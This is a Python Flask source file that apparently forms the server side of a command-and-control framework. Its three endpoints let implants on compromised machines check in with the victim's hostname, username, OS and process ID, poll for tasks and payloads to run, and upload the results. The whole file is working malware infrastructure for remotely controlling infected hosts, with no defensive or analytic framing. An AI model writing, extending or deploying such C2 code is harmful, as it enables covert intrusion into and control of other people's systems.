"""
routes/beacon.py: Endpoints that the implant talks to.

  POST /api/beacon/checkin          — register / heartbeat
  GET  /api/beacon/<uuid>/tasks     — poll for pending tasks
  POST /api/beacon/<uuid>/result    — submit task output
"""

from flask import Blueprint, request, jsonify
import db

beacon_bp = Blueprint("beacon", __name__, url_prefix="/api/beacon")


def _err(msg: str, code: int = 400):
    return jsonify({"status": "error", "message": msg}), code


# ==================== Check-in ====================

@beacon_bp.route("/checkin", methods=["POST"])
def checkin():
    data = request.get_json(silent=True)
    if not data:
        return _err("expected JSON body")

    required = ["uuid", "hostname", "username", "os", "arch", "pid"]
    missing = [f for f in required if f not in data]
    if missing:
        return _err(f"missing fields: {missing}")

    is_new = db.upsert_beacon(data)

    # Log to server console
    tag = "NEW BEACON" if is_new else "CHECKIN"
    print(f"  [{tag}] {data['uuid'][:8]}  {data['username']}@{data['hostname']}  ({data['os']})")

    return jsonify({"status": "ok", "registered": is_new})


# ==================== Task poll ====================

@beacon_bp.route("/<beacon_uuid>/tasks", methods=["GET"])
def get_tasks(beacon_uuid: str):
    beacon = db.get_beacon(beacon_uuid)
    if not beacon:
        return _err("unknown beacon", 404)

    tasks = db.get_pending_tasks(beacon_uuid)

    # Shape for wire format
    wire_tasks = [
        {
            "task_id": t["task_id"],
            "type": t["type"],
            "payload": t["payload"],
        }
        for t in tasks
    ]

    if wire_tasks:
        print(f"  [TASKS] dispatched {len(wire_tasks)} task(s) → {beacon_uuid[:8]}")

    return jsonify({"tasks": wire_tasks})


# ==================== Result submission ====================

@beacon_bp.route("/<beacon_uuid>/result", methods=["POST"])
def submit_result(beacon_uuid: str):
    beacon = db.get_beacon(beacon_uuid)
    if not beacon:
        return _err("unknown beacon", 404)

    data = request.get_json(silent=True)
    if not data or "task_id" not in data:
        return _err("expected JSON body with task_id")

    db.store_result(beacon_uuid, data)

    exit_code = data.get("exit_code", "?")
    print(f"  [RESULT] task {data['task_id']}  exit={exit_code}  beacon={beacon_uuid[:8]}")

    return jsonify({"status": "ok"})
